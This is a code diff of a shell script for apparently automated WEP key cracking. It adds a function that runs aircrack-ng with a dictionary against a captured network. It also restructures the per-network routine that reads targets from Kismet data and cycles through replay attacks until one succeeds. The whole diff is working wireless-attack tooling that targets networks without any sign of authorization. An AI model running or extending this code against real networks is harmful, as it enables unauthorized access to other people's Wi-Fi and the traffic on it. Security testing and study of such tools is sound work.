@@ -660,6 +660,17 @@ h_wep_crack() {
 	exec $cmd
 }
 
+h_wep_dict() {
+	local cmd
+	local keysize
+	local dictfile
+	keysize=$1
+	dictfile=$2
+	cmd="aircrack-ng -q -b $H_CUR_BSSID -l -n $keysize -w $dictfile $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
+	h_log "running: $cmd"
+	$cmd
+}
+
 h_wep_auth() {
 	local cmd
 	cmd="aireplay-ng $H_MON_IF $*"
@@ -747,23 +758,9 @@ H_WEP_ATTACKS=" \
 	h_wep_try_arp_replay_2 \
 "
 
-h_wep_try_one_network() {
-	local N
+h_wep_attack() {
 	local capture_options
 
-	N=$1
-	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
-	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
-	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
-	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
-	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
-
-	if grep -q "^$H_CUR_BSSID," $H_WEP_F; then
-		h_log "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
-		return 0
-	fi
-
-	h_log "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 	h_hook_call_handlers on_wep_attack_started
 	
 	h_hw_prepare
@@ -783,14 +780,34 @@ h_wep_try_one_network() {
 
 	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
 	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
-
+	
 	for attack in $H_WEP_ATTACKS; do
 		$attack && break
 	done
-	
+
 	h_capture_stop
 
 	h_hook_call_handlers on_wep_attack_ended
+}
+
+h_wep_try_one_network() {
+	local N
+
+	N=$1
+	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
+	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
+	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
+	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
+	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
+
+	if grep -q "^$H_CUR_BSSID," $H_WEP_F; then
+		h_log "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+		return 0
+	fi
+
+	h_log "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+
+	[ "$H_OP_MODE_wep_attack" = "1" ] && h_wep_attack
 }
 
 h_wep_try_all_networks() {
